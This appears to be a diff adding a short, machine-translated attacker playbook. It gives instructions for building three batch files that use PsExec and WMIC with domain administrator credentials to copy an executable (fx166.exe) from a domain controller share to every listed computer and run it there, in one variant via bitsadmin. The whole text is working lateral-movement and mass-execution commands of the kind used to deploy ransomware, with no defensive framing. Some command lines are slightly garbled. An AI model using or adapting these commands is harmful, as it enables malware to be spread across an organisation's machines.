@@ -1,0 +1,11 @@
+COLLECTION OF A BATNIK TO COPY A FILE THROUGHOUT THE DOMAIN 
+START PSEX.EX /ACCEPTEULA @C\:share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\PRIMARY DOMAIN CONTROLLER\share$\fx166.ex" "C:\windows\temp" 
+SAVE AS "copies.bat"
+
+COLLECT A BATNIK TO RUN A FILE ACROSS THE ENTIRE DOMAIN
+start PsExec.exe -d @C:\share$\comps1.tXt -U domain\administrator -p PASSWORD cmd /c C:\windows\temp\fx166.ex 
+SAVE AS "exe.bat"
+
+COLLECT THE WMI BATNIK TO COPY AND RUN THE FILE THROUGHOUT THE DOMAIN
+start wmic /node:@C:\share$\comps1.txt /user:"DOMAIN\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\DOMAIN CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe&%APPDATA%\fx166.exe"
+SAVE AS "WMI. BAT"
